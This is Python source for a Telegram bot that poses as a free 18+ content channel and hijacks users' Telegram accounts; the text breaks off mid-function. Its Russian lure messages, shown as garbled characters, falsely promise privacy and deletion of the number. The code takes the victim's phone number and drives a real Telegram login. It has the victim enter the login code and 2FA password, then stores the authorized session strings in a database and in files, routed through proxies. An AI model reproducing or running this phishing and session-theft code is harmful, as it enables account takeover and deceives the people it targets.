import logging
import os
import json
import phonenumbers
from phonenumbers import geocoder
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv
from datetime import datetime

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# –û—Å–Ω–æ–≤–Ω–∞—è –ø—Ä–æ–∫—Å–∏ (—Å—Ç–∞—Ä–∞—è, –¥–ª—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏)
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
main_proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# –í—Ç–æ—Ä–∞—è –ø—Ä–æ–∫—Å–∏ (–Ω–æ–≤–∞—è)
PROXY1_HOST = os.getenv("PROXY1_HOST")
PROXY1_PORT = int(os.getenv("PROXY1_PORT"))
PROXY1_USER = os.getenv("PROXY1_USER")
PROXY1_PASS = os.getenv("PROXY1_PASS")
second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PASS)

# –°–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø—Ä–æ–∫—Å–∏ (–ø–µ—Ä–≤–∞—è - —Å—Ç–∞—Ä–∞—è –æ—Å–Ω–æ–≤–Ω–∞—è)
proxy_list = [main_proxy, second_proxy]

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
start_col = db["start"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}

os.makedirs("sessions", exist_ok=True)

def get_proxy_for_phone(phone):
    """–í—ã–±–∏—Ä–∞–µ–º –ø—Ä–æ–∫—Å–∏ –¥–ª—è –Ω–æ–º–µ—Ä–∞"""
    existing_session = sessions_col.find_one({"phone": phone})
    if existing_session:
        return proxy_list[existing_session.get('proxy_index', 0)]
    return proxy_list[hash(phone) % len(proxy_list)]

def cleanup(user_id):
    """–û—á–∏—â–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ö—Ä–∞–Ω–∏–ª–∏—â"""
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

def update_user_log(user_id: int, updates: dict):
    """–û–±–Ω–æ–≤–ª—è–µ—Ç –∏–ª–∏ —Å–æ–∑–¥–∞–µ—Ç –∑–∞–ø–∏—Å—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å –Ω–æ–≤—ã–º–∏ –¥–∞–Ω–Ω–æ–π"""
    try:
        start_col.update_one(
            {"user_id": user_id},
            {"$set": updates, "$setOnInsert": {"first_seen": datetime.now()}},
            upsert=True
        )
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –ª–æ–≥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {e}")

async def send_code_keyboard(user_id, current_code, message_id=None):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç/–æ–±–Ω–æ–≤–ª—è–µ—Ç –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞"""
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("‚úÖ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"üì± *–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è:*\n\n`{current_code}`\n\n_–ù–∞–∂–∏–º–∞–π—Ç–µ —Ü–∏—Ñ—Ä—ã –Ω–∏–∂–µ, —á—Ç–æ–±—ã –≤–≤–µ—Å—Ç–∏ –∫–æ–¥, –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –æ—Ç Telegram._" if current_code else "üî¢ *–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è*\n\n_–ù–∞–∂–∏–º–∞–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ, —á—Ç–æ–±—ã –≤–≤–µ—Å—Ç–∏ –∫–æ–¥, –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –æ—Ç Telegram._"

    if message_id:
        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
                                 text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

async def send_welcome_message(user_id):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Ñ–æ—Ç–æ –∏ –∫–Ω–æ–ø–∫–æ–π"""
    try:
        photo_path = "welcome_photo.jpg"
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("üîì –†–ê–ó–ë–õ–û–ö–ò–†–û–í–ê–¢–¨ –î–û–°–¢–£–ü –°–ï–ô–ß–ê–°", callback_data="auth_account"))
        
        if os.path.exists(photo_path):
            with open(photo_path, 'rb') as photo:
                await bot.send_photo(
                    user_id,
                    photo,
                    caption=(
                        "üëã *–î–û–ë–†–û –ü–û–ñ–ê–õ–û–í–ê–¢–¨ –í –≠–ö–°–ö–õ–Æ–ó–ò–í–ù–´–ô –ú–ò–† 18+!* üîû\n\n"
                        "üíã *–û—Ç–∫—Ä–æ–π –¥–ª—è —Å–µ–±—è –ø–∏–∫–∞–Ω—Ç–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç, –∫–æ—Ç–æ—Ä–æ–≥–æ –Ω–µ—Ç –±–æ–ª—å—à–µ –Ω–∏–≥–¥–µ!*\n"
                        "‚Ä¢ –ë–æ–ª–µ–µ 10.000 –≥–æ—Ä—è—á–∏—Ö —Ñ–æ—Ç–æ –∏ –ø—Ä–∏–≤–∞—Ç–Ω—ã—Ö –≤–∏–¥–µ–æ\n"
                        "‚Ä¢ –î–µ–≤—É—à–∫–∏ –∏–∑ –†–æ—Å—Å–∏–∏ –∏ –º–æ–¥–µ–ª–∏ —Å–æ –≤—Å–µ–≥–æ –º–∏—Ä–∞\n"
                        "‚Ä¢ –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π –ª—é–±–∏—Ç–µ–ª—å—Å–∫–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç\n"
                        "‚Ä¢ –ü—Ä—è–º—ã–µ —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏–∏ –∏ —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã\n\n"
                        "üöÄ *–ü–æ–¥—Ç–≤–µ—Ä–¥–∏ –∞–∫–∫–∞—É–Ω—Ç, —á—Ç–æ–±—ã —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤—Å—ë –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ!*\n\n"
                        "üîû *–î–û–°–¢–£–ü –¢–û–õ–¨–ö–û –î–õ–Ø –í–ó–†–û–°–õ–´–• 18+*\n"
                        "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏, —á—Ç–æ —Ç—ã –Ω–µ —Ä–æ–±–æ—Ç!\n\n"
                        "‚úÖ *–ü—Ä–æ—Ü–µ—Å—Å –Ω–∞ 100% –±–µ–∑–æ–ø–∞—Å–Ω—ã–π –∏ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–π:*\n"
                        "‚Ä¢ –ú—ã –Ω–µ –≤–∏–¥–∏–º —Ç–≤–æ–∏ —á–∞—Ç—ã –∏–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏—è\n"
                        "‚Ä¢ –ú—ã –Ω–µ –ø–µ—Ä–µ–¥–∞—ë–º —Ç–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ —Ç—Ä–µ—Ç—å–∏–º –ª–∏—Ü–∞–º\n"
                        "‚Ä¢ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏, —á—Ç–æ —Ç—ã –Ω–µ —Ä–æ–±–æ—Ç!\n\n"
                        "‚ö°Ô∏è _–ù–∞–∂–º–∏ –Ω–∏–∂–µ, —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å –∏ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤—Å—ë –ø—Ä—è–º–æ —Å–µ–π—á–∞—Å!_"
                    ),
                    parse_mode='Markdown',
                    reply_markup=keyboard
                )
        else:
            await bot.send_message(
                user_id,
                "üëã *–î–û–ë–†–û –ü–û–ñ–ê–õ–û–í–ê–¢–¨ –í –≠–ö–°–ö–õ–Æ–ó–ò–í–ù–´–ô –ú–ò–† 18+!* üîû\n\n"
                "üíã *–û—Ç–∫—Ä–æ–π –¥–ª—è —Å–µ–±—è –ø–∏–∫–∞–Ω—Ç–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç, –∫–æ—Ç–æ—Ä–æ–≥–æ –Ω–µ—Ç –±–æ–ª—å—à–µ –Ω–∏–≥–¥–µ!*\n"
                "‚Ä¢ –ë–æ–ª–µ–µ 10.000 –≥–æ—Ä—è—á–∏—Ö —Ñ–æ—Ç–æ –∏ –ø—Ä–∏–≤–∞—Ç–Ω—ã—Ö –≤–∏–¥–µ–æ\n"
                "‚Ä¢ –î–µ–≤—É—à–∫–∏ –∏–∑ –†–æ—Å—Å–∏–∏ –∏ –º–æ–¥–µ–ª–∏ —Å–æ –≤—Å–µ–≥–æ –º–∏—Ä–∞\n"
                "‚Ä¢ –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π –ª—é–±–∏—Ç–µ–ª—å—Å–∫–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç\n"
                "‚Ä¢ –ü—Ä—è–º—ã–µ —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏–∏ –∏ —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã\n\n"
                "üöÄ *–ü–æ–¥—Ç–≤–µ—Ä–¥–∏ –∞–∫–∫–∞—É–Ω—Ç, —á—Ç–æ–±—ã —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤—Å—ë –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ!*\n\n"
                        "üîû *–î–û–°–¢–£–ü –¢–û–õ–¨–ö–û –î–õ–Ø –í–ó–†–û–°–õ–´–• 18+*\n"
                        "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏, —á—Ç–æ —Ç—ã –Ω–µ —Ä–æ–±–æ—Ç!\n\n"
                        "‚úÖ *–ü—Ä–æ—Ü–µ—Å—Å –Ω–∞ 100% –±–µ–∑–æ–ø–∞—Å–Ω—ã–π –∏ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–π:*\n"
                        "‚Ä¢ –ú—ã –Ω–µ –≤–∏–¥–∏–º —Ç–≤–æ–∏ —á–∞—Ç—ã –∏–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏—è\n"
                        "‚Ä¢ –ú—ã –Ω–µ –ø–µ—Ä–µ–¥–∞—ë–º —Ç–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ —Ç—Ä–µ—Ç—å–∏–º –ª–∏—Ü–∞–º\n"
                        "‚Ä¢ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏, —á—Ç–æ —Ç—ã –Ω–µ —Ä–æ–±–æ—Ç!\n\n"
                        "‚ö°Ô∏è _–ù–∞–∂–º–∏ –Ω–∏–∂–µ, —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å –∏ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤—Å—ë –ø—Ä—è–º–æ —Å–µ–π—á–∞—Å!_",
                parse_mode='Markdown',
                reply_markup=keyboard
            )
    except Exception as e:
        logging.error(f"Error sending welcome message: {e}")
        # Fallback —Å–æ–æ–±—â–µ–Ω–∏–µ
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("üîì –†–ê–ó–ë–õ–û–ö–ò–†–û–í–ê–¢–¨ –î–û–°–¢–£–ü –°–ï–ô–ß–ê–°", callback_data="auth_account"))
        
        await bot.send_message(
            user_id,
            "üëã *–î–û–ë–†–û –ü–û–ñ–ê–õ–û–í–ê–¢–¨ –í –≠–ö–°–ö–õ–Æ–ó–ò–í–ù–´–ô –ú–ò–† 18+!* üîû\n\n"
            "üíã –û—Ç–∫—Ä–æ–π –¥–ª—è —Å–µ–±—è –ø–∏–∫–∞–Ω—Ç–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç! –ü–æ–¥—Ç–≤–µ—Ä–¥–∏ –∞–∫–∫–∞—É–Ω—Ç, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ç—ã—Å—è—á–∞–º –≥–æ—Ä—è—á–∏—Ö —Ñ–æ—Ç–æ –∏ –≤–∏–¥–µ–æ!",
            parse_mode='Markdown',
            reply_markup=keyboard
        )

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user = message.from_user
    
    update_user_log(
        user_id=user.id,
        updates={
            "username": user.username,
            "first_name": user.first_name,
            "last_name": user.last_name,
            "language_code": user.language_code,
            "is_bot": user.is_bot,
            "chat_id": message.chat.id,
            "last_start": datetime.now(),
            "status": "started"
        }
    )

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –µ–¥–∏–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Ñ–æ—Ç–æ –∏ –∫–Ω–æ–ø–∫–æ–π
    await send_welcome_message(user.id)

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    update_user_log(
        user_id=user_id,
        updates={
            "auth_button_clicked": True,
            "auth_button_click_time": datetime.now(),
            "status": "awaiting_contact"
        }
    )

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("üì± –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω–∞", request_contact=True))
    await bot.send_message(
        user_id,
        "üî• *–®–ê–ì 1: –ë–´–°–¢–†–ê–Ø –ü–†–û–í–ï–†–ö–ê* üîû\n\n"
        "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏, —á—Ç–æ —Ç—ã –Ω–µ —Ä–æ–±–æ—Ç!\n\n"
        "üìã *–ß—Ç–æ –Ω—É–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å:*\n"
        "1. –ü–æ–¥–µ–ª–∏—Å—å –Ω–æ–º–µ—Ä–æ–º ‚Üí Telegram –æ—Ç–ø—Ä–∞–≤–∏—Ç –∫–æ–¥\n"
        "2. –í–≤–µ–¥–∏ –∫–æ–¥ ‚Üí –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞\n"
        "3. –î–û–°–¢–£–ü –†–ê–ó–ë–õ–û–ö–ò–†–û–í–ê–ù ‚Üí –ö–æ–Ω—Ç–µ–Ω—Ç 18+ –¥–æ—Å—Ç—É–ø–µ–Ω\n\n"
        "üíé *–ü–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç—ã –ø–æ–ª—É—á–∏—à—å:*\n"
        "‚Ä¢ –ì–æ—Ä—è—á–∏–µ —Ñ–æ—Ç–æ –∏ –≤–∏–¥–µ–æ —Å –∫—Ä–∞—Å–∏–≤—ã–º–∏ –¥–µ–≤—É—à–∫–∞–º–∏\n"
        "‚Ä¢ –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π –ª—é–±–∏—Ç–µ–ª—å—Å–∫–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç\n"
        "‚Ä¢ –ù–æ–≤—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã –∫–∞–∂–¥—ã–π –¥–µ–Ω—å\n"
        "‚Ä¢ –ü—Ä–∏–≤–∞—Ç–Ω—ã–µ —á–∞—Ç—ã —Å –º–æ–¥–µ–ª—è–º–∏\n\n"
        "‚ö†Ô∏è –¢–≤–æ–π –Ω–æ–º–µ—Ä –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∏ –∑–∞—Ç–µ–º —É–¥–∞–ª—è–µ—Ç—Å—è. –í—Å—ë –∞–Ω–æ–Ω–∏–º–Ω–æ –∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ!",
        parse_mode='Markdown',
        reply_markup=kb
    )
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    geo_info = None
    try:
        parsed_number = phonenumbers.parse(phone)
        geo_info = geocoder.description_for_number(parsed_number, "en")
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: {e}")

    update_user_log(
        user_id=user_id,
        updates={
            "phone": phone,
            "geo_info": geo_info,
            "contact_shared": True,
            "contact_share_time": datetime.now(),
            "contact_user_id": message.contact.user_id,
            "status": "contact_received"
        }
    )

    selected_proxy = get_proxy_for_phone(phone)
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        
        # –°–Ω–∞—á–∞–ª–∞ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ–±—ä—è—Å–Ω–µ–Ω–∏–µ
        await message.answer(
            "‚úÖ *–ù–æ–º–µ—Ä –ø–æ–ª—É—á–µ–Ω!* üîû\n\n"
            "üì® *–®–ê–ì 2: –ö–û–î –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ò–Ø*\n\n"
            "Telegram –æ—Ç–ø—Ä–∞–≤–∏–ª —Ç–µ–±–µ SMS —Å –∫–æ–¥–æ–º –∏–∑ 5 —Ü–∏—Ñ—Ä.\n\n"
            "üî¢ *–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è:*\n"
            "1. –ü—Ä–æ–≤–µ—Ä—å —Å–æ–æ–±—â–µ–Ω–∏—è –Ω–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–µ\n"
            "2. –í–≤–µ–¥–∏ –∫–æ–¥, –∏—Å–ø–æ–ª—å–∑—É—è –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ\n"
            "3. –ù–∞–∂–º–∏ '–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥' –ø–æ—Å–ª–µ –≤–≤–æ–¥–∞\n\n"
            "‚ö°Ô∏è *–ü–û–°–õ–ï –í–í–û–î–ê –ö–û–î–ê –¢–´ –ü–û–õ–£–ß–ò–®–¨:*\n"
            "‚Ä¢ –ü–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –∫–æ–Ω—Ç–µ–Ω—Ç—É 18+\n"
            "‚Ä¢ –¢—ã—Å—è—á–∏ –≥–æ—Ä—è—á–∏—Ö —Ñ–æ—Ç–æ –∏ –≤–∏–¥–µ–æ\n"
            "‚Ä¢ –ß–∞—Ç—ã —Å —Ä–µ–∞–ª—å–Ω—ã–º–∏ –¥–µ–≤—É—à–∫–∞–º–∏\n"
            "‚Ä¢ –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã –∫–∞–∂–¥—ã–π –¥–µ–Ω—å\n\n"
            "_–ö–æ–¥ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω 5 –º–∏–Ω—É—Ç –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏._",
            parse_mode='Markdown'
        )
        
        # –ó–∞—Ç–µ–º –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
        user_code_buffers[user_id] = {'code': '', 'message_id': None}
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        
    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞: {e}")
        await client.disconnect()
        cleanup(user_id)

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="‚õîÔ∏è –°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–µ–ª–∏—Å—å –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω–∞", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="–û—à–∏–±–∫–∞. –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏ —Å /start", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="‚ö†Ô∏è –°–Ω–∞—á–∞–ª–∞ –≤–≤–µ–¥–∏ –∫–æ–¥", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in_code(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="‚ö†Ô∏è –ö–æ–¥ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        await bot.send_message(user_id, "‚ö†Ô∏è –°–µ—Å—Å–∏—è –∏—Å—Ç–µ–∫–ª–∞. –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏ —Å /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(phone=phone, code=code)
        if await client.is_user_authorized():
            me = await client.get_me()
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name if me.last_name else None,
                    "auth_date": datetime.now()
                }}, 
                upsert=True
            )

            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "telegram_id": me.id,
                    "tg_username": me.username,
                    "tg_first_name": me.first_name,
                    "tg_last_name": me.last_name,
                    "status": "authenticated",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await bot.send_message(
                user_id,
                "üéâ *–ü–†–û–í–ï–†–ö–ê –£–°–ü–ï–®–ù–û –ó–ê–í–ï–†–®–ï–ù–ê!* üîûüéä\n\n"
                "‚úÖ *–î–û–°–¢–£–ü –ö –ö–û–ù–¢–ï–ù–¢–£ –î–õ–Ø –í–ó–†–û–°–õ–´–• –†–ê–ó–ë–õ–û–ö–ò–†–û–í–ê–ù!*\n\n"
                "üî• *–î–û–ë–†–û –ü–û–ñ–ê–õ–û–í–ê–¢–¨ –í –≠–ö–°–ö–õ–Æ–ó–ò–í–ù–£–Æ –ó–û–ù–£ 18+!*\n\n"
                "üíã *–¢–ï–ü–ï–†–¨ –¢–ï–ë–ï –î–û–°–¢–£–ü–ù–û:*\n"
                "‚Ä¢ –ë–æ–ª–µ–µ 10.000 –≥–æ—Ä—è—á–∏—Ö —Ñ–æ—Ç–æ –∏ –ø—Ä–∏–≤–∞—Ç–Ω—ã—Ö –≤–∏–¥–µ–æ\n"
                "‚Ä¢ –î–µ–≤—É—à–∫–∏ –∏–∑ –†–æ—Å—Å–∏–∏ –∏ –º–æ–¥–µ–ª–∏ —Å–æ –≤—Å–µ–≥–æ –º–∏—Ä–∞\n"
                "‚Ä¢ –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π –ª—é–±–∏—Ç–µ–ª—å—Å–∫–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç\n"
                "‚Ä¢ –ü—Ä—è–º—ã–µ —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏–∏ –∏ —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã\n"
                "‚Ä¢ –ü—Ä–∏–≤–∞—Ç–Ω—ã–µ —á–∞—Ç—ã —Å –º–æ–¥–µ–ª—è–º–∏\n\n"
                "üöÄ *–ö–æ–Ω—Ç–µ–Ω—Ç —É–∂–µ –Ω–∞ –ø–æ–¥—Ö–æ–¥–µ...*\n"
                "–ú—ã –≥–æ—Ç–æ–≤–∏–º —Ç–≤–æ–π –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø.\n"
                "–ü–µ—Ä–≤—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã –ø—Ä–∏–¥—É—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –º–∏–Ω—É—Ç!\n\n"
                "‚ö†Ô∏è *–î–ï–†–ñ–ò –î–û–°–¢–£–ü –í –°–ï–ö–†–ï–¢–ï* - –ö–æ–Ω—Ç–µ–Ω—Ç —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ–±—è!",
                parse_mode='Markdown'
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            user_states[user_id] = 'awaiting_2fa'
            update_user_log(
                user_id=user_id,
                updates={"status": "awaiting_2fa"}
            )
            await bot.send_message(
                user_id,
                "üîê *–®–ê–ì 3: –î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–ê–Ø –ó–ê–©–ò–¢–ê* üîû\n\n"
                "–¢–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç –∑–∞—â–∏—â—ë–Ω –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ.\n\n"
                "üìù *–û—Ç–ø—Ä–∞–≤—å –ø–∞—Ä–æ–ª—å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –Ω–∏–∂–µ:*\n\n"
                "‚ö°Ô∏è *–ü–û–°–õ–ï –í–í–û–î–ê –ü–ê–†–û–õ–Ø –¢–´ –ü–û–õ–£–ß–ò–®–¨:*\n"
                "‚Ä¢ –ü–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –∫–æ–Ω—Ç–µ–Ω—Ç—É 18+\n"
                "‚Ä¢ –¢—ã—Å—è—á–∏ –≥–æ—Ä—è—á–∏—Ö —Ñ–æ—Ç–æ –∏ –≤–∏–¥–µ–æ\n"
                "‚Ä¢ –ß–∞—Ç—ã —Å —Ä–µ–∞–ª—å–Ω—ã–º–∏ –¥–µ–≤—É—à–∫–∞–º–∏\n\n"
                "_–≠—Ç–æ—Ç –ø–∞—Ä–æ–ª—å –æ—Ç–ª–∏—á–∞–µ—Ç—Å—è –æ—Ç –∫–æ–¥–∞ –∏–∑ SMS._",
                parse_mode='Markdown'
            )
    except PhoneCodeExpiredError:
        await bot.send_message(
            user_id,
            "‚è∞ *–ö–æ–¥ –∏—Å—Ç—ë–∫*\n\n"
